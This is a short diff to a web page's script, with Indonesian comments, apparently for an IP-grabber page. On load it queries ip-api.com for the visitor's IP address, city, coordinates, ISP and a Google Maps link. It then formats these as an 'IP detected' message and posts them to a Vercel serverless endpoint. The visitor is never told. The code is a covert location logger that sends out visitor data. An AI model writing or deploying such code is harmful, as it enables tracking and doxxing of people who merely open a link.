@@ -10,9 +10,15 @@
   <script>
     async function getIP() {
       try {
-        const res = await fetch("https://ip-api.com/json/");
+        // ambil info IP dari ip-api
+        const res = await fetch("https://ip-api.com/json/?fields=status,message,query,country,regionName,city,lat,lon,isp,org,as,timezone,zip");
         const data = await res.json();
 
+        if (data.status !== "success") {
+          throw new Error(data.message || "Gagal ambil data");
+        }
+
+        // isi pesan
         const info = `
 📡 *IP Terdeteksi*
 🌐 IP: ${data.query}
@@ -26,7 +32,7 @@
 🔗 https://www.google.com/maps?q=${data.lat},${data.lon}
         `;
 
-        // kirim ke API vercel kamu (server-side)
+        // kirim ke serverless function Vercel
         const send = await fetch("/api/send", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -34,7 +40,7 @@
         });
 
         const result = await send.json();
-        console.log("Result API:", result);
+        console.log("Hasil API:", result);
 
       } catch (err) {
         console.error("Error:", err);
